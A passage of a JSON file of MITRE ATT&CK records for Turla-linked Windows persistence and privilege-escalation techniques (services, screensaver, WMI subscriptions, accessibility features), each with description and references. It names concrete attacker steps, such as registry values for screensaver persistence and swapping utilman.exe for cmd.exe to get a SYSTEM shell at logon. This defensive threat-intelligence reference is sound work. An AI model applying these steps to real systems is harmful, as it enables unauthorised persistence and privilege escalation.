      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/581.html",
        "description": "none",
        "external_id": "CAPEC-581"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
    "platform": "windows",
    "tid": "T1543.003",
    "technique": "Windows Service",
    "tactic": "persistence",
    "datasources": "command-execution|driver-load|os-api-execution|process-creation|service-creation|service-modification|windows-registry-key-creation|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon|kazuar",
    "correlation_tool": "empire|psexec",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002). To make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component).",
    "technique_references": [
      {
        "source_name": "Microsoft Windows Event Forwarding FEB 2018",
        "url": "https://docs.microsoft.com/windows/security/threat-protection/use-windows-event-forwarding-to-assist-in-intrusion-detection",
        "description": "Hardy, T. & Hall, J. (2018, February 15). Use Windows Event Forwarding to help with intrusion detection. Retrieved August 7, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "ESET InvisiMole June 2020",
        "url": "https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf",
        "description": "Hromcova, Z. and Cherpanov, A. (2020, June). INVISIMOLE: THE HIDDEN PART OF THE STORY. Retrieved July 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Services",
        "url": "https://technet.microsoft.com/en-us/library/cc772408.aspx",
        "description": "Microsoft. (n.d.). Services. Retrieved June 7, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft 4697 APR 2017",
        "url": "https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4697",
        "description": "Miroshnikov, A. & Hall, J. (2017, April 18). 4697(S): A service was installed in the system. Retrieved August 7, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Symantec W.32 Stuxnet Dossier",
        "url": "https://www.wired.com/images_blogs/threatlevel/2010/11/w32_stuxnet_dossier.pdf",
        "description": "Nicolas Falliere, Liam O. Murchu, Eric Chien. (2011, February). W32.Stuxnet Dossier. Retrieved December 7, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Unit42 AcidBox June 2020",
        "url": "https://unit42.paloaltonetworks.com/acidbox-rare-malware/",
        "description": "Reichel, D. and Idrizovic, E. (2020, June 17). AcidBox: Rare Malware Repurposing Turla Group Exploit Targeted Russian Organizations. Retrieved March 16, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Crowdstrike DriveSlayer February 2022",
        "url": "https://www.crowdstrike.com/blog/how-crowdstrike-falcon-protects-against-wiper-malware-used-in-ukraine-attacks/",
        "description": "Thomas, W. et al. (2022, February 25). CrowdStrike Falcon Protects from New Wiper Malware Used in Ukraine Cyberattacks. Retrieved March 25, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/478.html",
        "description": "none",
        "external_id": "CAPEC-478"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/550.html",
        "description": "none",
        "external_id": "CAPEC-550"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/551.html",
        "description": "none",
        "external_id": "CAPEC-551"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "administrator|system",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
    "platform": "windows",
    "tid": "T1543.003",
    "technique": "Windows Service",
    "tactic": "privilege-escalation",
    "datasources": "command-execution|driver-load|os-api-execution|process-creation|service-creation|service-modification|windows-registry-key-creation|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon|kazuar",
    "correlation_tool": "empire|psexec",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002). To make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component).",
    "technique_references": [
      {
        "source_name": "Microsoft Windows Event Forwarding FEB 2018",
        "url": "https://docs.microsoft.com/windows/security/threat-protection/use-windows-event-forwarding-to-assist-in-intrusion-detection",
        "description": "Hardy, T. & Hall, J. (2018, February 15). Use Windows Event Forwarding to help with intrusion detection. Retrieved August 7, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "ESET InvisiMole June 2020",
        "url": "https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf",
        "description": "Hromcova, Z. and Cherpanov, A. (2020, June). INVISIMOLE: THE HIDDEN PART OF THE STORY. Retrieved July 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Services",
        "url": "https://technet.microsoft.com/en-us/library/cc772408.aspx",
        "description": "Microsoft. (n.d.). Services. Retrieved June 7, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft 4697 APR 2017",
        "url": "https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4697",
        "description": "Miroshnikov, A. & Hall, J. (2017, April 18). 4697(S): A service was installed in the system. Retrieved August 7, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Symantec W.32 Stuxnet Dossier",
        "url": "https://www.wired.com/images_blogs/threatlevel/2010/11/w32_stuxnet_dossier.pdf",
        "description": "Nicolas Falliere, Liam O. Murchu, Eric Chien. (2011, February). W32.Stuxnet Dossier. Retrieved December 7, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Unit42 AcidBox June 2020",
        "url": "https://unit42.paloaltonetworks.com/acidbox-rare-malware/",
        "description": "Reichel, D. and Idrizovic, E. (2020, June 17). AcidBox: Rare Malware Repurposing Turla Group Exploit Targeted Russian Organizations. Retrieved March 16, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Crowdstrike DriveSlayer February 2022",
        "url": "https://www.crowdstrike.com/blog/how-crowdstrike-falcon-protects-against-wiper-malware-used-in-ukraine-attacks/",
        "description": "Thomas, W. et al. (2022, February 25). CrowdStrike Falcon Protects from New Wiper Malware Used in Ukraine Cyberattacks. Retrieved March 25, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/478.html",
        "description": "none",
        "external_id": "CAPEC-478"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/550.html",
        "description": "none",
        "external_id": "CAPEC-550"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/551.html",
        "description": "none",
        "external_id": "CAPEC-551"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "administrator|system",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--ce4b7013-640e-48a9-b501-d0025a95f4bf",
    "platform": "windows",
    "tid": "T1546.002",
    "technique": "Screensaver",
    "tactic": "persistence",
    "datasources": "command-execution|file-creation|file-modification|process-creation|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "gazer",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\\Windows\\System32\\</code>, and <code>C:\\Windows\\sysWOW64\\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.\n\nThe following screensaver settings are stored in the Registry (<code>HKCU\\Control Panel\\Desktop\\</code>) and could be manipulated to achieve persistence:\n\n* <code>SCRNSAVE.exe</code> - set to malicious PE path\n* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver\n* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock\n* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed\n\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.(Citation: ESET Gazer Aug 2017)",
    "technique_references": [
      {
        "source_name": "ESET Gazer Aug 2017",
        "url": "https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf",
        "description": "ESET. (2017, August). Gazing at Gazer: Turla’s new second stage backdoor. Retrieved September 14, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia Screensaver",
        "url": "https://en.wikipedia.org/wiki/Screensaver",
        "description": "Wikipedia. (2017, November 22). Screensaver. Retrieved December 5, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--ce4b7013-640e-48a9-b501-d0025a95f4bf",
    "platform": "windows",
    "tid": "T1546.002",
    "technique": "Screensaver",
    "tactic": "privilege-escalation",
    "datasources": "command-execution|file-creation|file-modification|process-creation|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "gazer",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\\Windows\\System32\\</code>, and <code>C:\\Windows\\sysWOW64\\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.\n\nThe following screensaver settings are stored in the Registry (<code>HKCU\\Control Panel\\Desktop\\</code>) and could be manipulated to achieve persistence:\n\n* <code>SCRNSAVE.exe</code> - set to malicious PE path\n* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver\n* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock\n* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed\n\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.(Citation: ESET Gazer Aug 2017)",
    "technique_references": [
      {
        "source_name": "ESET Gazer Aug 2017",
        "url": "https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf",
        "description": "ESET. (2017, August). Gazing at Gazer: Turla’s new second stage backdoor. Retrieved September 14, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia Screensaver",
        "url": "https://en.wikipedia.org/wiki/Screensaver",
        "description": "Wikipedia. (2017, November 22). Screensaver. Retrieved December 5, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58",
    "platform": "windows",
    "tid": "T1546.003",
    "technique": "Windows Management Instrumentation Event Subscription",
    "tactic": "persistence",
    "datasources": "command-execution|process-creation|wmi-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime.(Citation: Mandiant M-Trends 2015)\n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.(Citation: FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation: Dell WMI Persistence)(Citation: Microsoft MOF May 2018)\n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",
    "technique_references": [
      {
        "source_name": "FireEye WMI 2015",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf",
        "description": "Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Dell WMI Persistence",
        "url": "https://www.secureworks.com/blog/wmi-persistence",
        "description": "Dell SecureWorks Counter Threat Unit™ (CTU) Research Team. (2016, March 28). A Novel WMI Persistence Implementation. Retrieved March 30, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye WMI SANS 2015",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf",
        "description": "Devon Kerr. (2015). There's Something About WMI. Retrieved May 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Medium Detecting WMI Persistence",
        "url": "https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96",
        "description": "French, D. (2018, October 9). Detecting & Removing an Attacker’s WMI Persistence. Retrieved October 11, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Elastic - Hunting for Persistence Part 1",
        "url": "https://www.elastic.co/blog/hunting-for-persistence-using-elastic-security-part-1",
        "description": "French, D., Murphy, B. (2020, March 24). Adversary tradecraft 101: Hunting for persistence using Elastic Security (Part 1). Retrieved December 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Mandiant M-Trends 2015",
        "url": "https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf",
        "description": "Mandiant. (2015, February 24). M-Trends 2015: A View from the Front Lines. Retrieved May 18, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Register-WmiEvent",
        "url": "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/register-wmievent?view=powershell-5.1",
        "description": "Microsoft. (n.d.). Retrieved January 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft MOF May 2018",
        "url": "https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-",
        "description": "Satran, M. (2018, May 30). Managed Object Format (MOF). Retrieved January 24, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58",
    "platform": "windows",
    "tid": "T1546.003",
    "technique": "Windows Management Instrumentation Event Subscription",
    "tactic": "privilege-escalation",
    "datasources": "command-execution|process-creation|wmi-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime.(Citation: Mandiant M-Trends 2015)\n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.(Citation: FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation: Dell WMI Persistence)(Citation: Microsoft MOF May 2018)\n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",
    "technique_references": [
      {
        "source_name": "FireEye WMI 2015",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf",
        "description": "Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Dell WMI Persistence",
        "url": "https://www.secureworks.com/blog/wmi-persistence",
        "description": "Dell SecureWorks Counter Threat Unit™ (CTU) Research Team. (2016, March 28). A Novel WMI Persistence Implementation. Retrieved March 30, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye WMI SANS 2015",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf",
        "description": "Devon Kerr. (2015). There's Something About WMI. Retrieved May 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Medium Detecting WMI Persistence",
        "url": "https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96",
        "description": "French, D. (2018, October 9). Detecting & Removing an Attacker’s WMI Persistence. Retrieved October 11, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Elastic - Hunting for Persistence Part 1",
        "url": "https://www.elastic.co/blog/hunting-for-persistence-using-elastic-security-part-1",
        "description": "French, D., Murphy, B. (2020, March 24). Adversary tradecraft 101: Hunting for persistence using Elastic Security (Part 1). Retrieved December 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Mandiant M-Trends 2015",
        "url": "https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf",
        "description": "Mandiant. (2015, February 24). M-Trends 2015: A View from the Front Lines. Retrieved May 18, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Register-WmiEvent",
        "url": "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/register-wmievent?view=powershell-5.1",
        "description": "Microsoft. (n.d.). Retrieved January 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft MOF May 2018",
        "url": "https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-",
        "description": "Satran, M. (2018, May 30). Managed Object Format (MOF). Retrieved January 24, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5",
    "platform": "windows",
    "tid": "T1546.008",
    "technique": "Accessibility Features",
    "tactic": "persistence",
    "datasources": "command-execution|file-creation|file-modification|process-creation|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nOther accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)\n\n* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/558.html",
        "description": "none",
        "external_id": "CAPEC-558"
      },
      {
        "source_name": "FireEye Hikit Rootkit",
        "url": "https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html",
        "description": "Glyer, C., Kazanciyan, R. (2012, August 20). The “Hikit” Rootkit: Advanced and Persistent Attack Techniques (Part 1). Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "DEFCON2016 Sticky Keys",
        "url": "https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom",
        "description": "Maldonado, D., McGuffin, T. (2016, August 6). Sticky Keys to the Kingdom. Retrieved July 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Tilbury 2014",
        "url": "http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/",
        "description": "Tilbury, C. (2014, August 28). Registry Analysis with CrowdResponse. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Narrator Accessibility Abuse",
        "url": "https://giuliocomi.blogspot.com/2019/10/abusing-windows-10-narrators-feedback.html",
        "description": "Comi, G. (2019, October 19). Abusing Windows 10 Narrator's 'Feedback-Hub' URI for Fileless Persistence. Retrieved April 28, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator",
    "technique_effective_permissions": "system",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5",
    "platform": "windows",
    "tid": "T1546.008",
    "technique": "Accessibility Features",
    "tactic": "privilege-escalation",
    "datasources": "command-execution|file-creation|file-modification|process-creation|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nOther accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)\n\n* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/558.html",
        "description": "none",
        "external_id": "CAPEC-558"
      },
      {
        "source_name": "FireEye Hikit Rootkit",
        "url": "https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html",
        "description": "Glyer, C., Kazanciyan, R. (2012, August 20). The “Hikit” Rootkit: Advanced and Persistent Attack Techniques (Part 1). Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "DEFCON2016 Sticky Keys",
        "url": "https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom",
        "description": "Maldonado, D., McGuffin, T. (2016, August 6). Sticky Keys to the Kingdom. Retrieved July 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Tilbury 2014",
        "url": "http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/",
        "description": "Tilbury, C. (2014, August 28). Registry Analysis with CrowdResponse. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Narrator Accessibility Abuse",
        "url": "https://giuliocomi.blogspot.com/2019/10/abusing-windows-10-narrators-feedback.html",
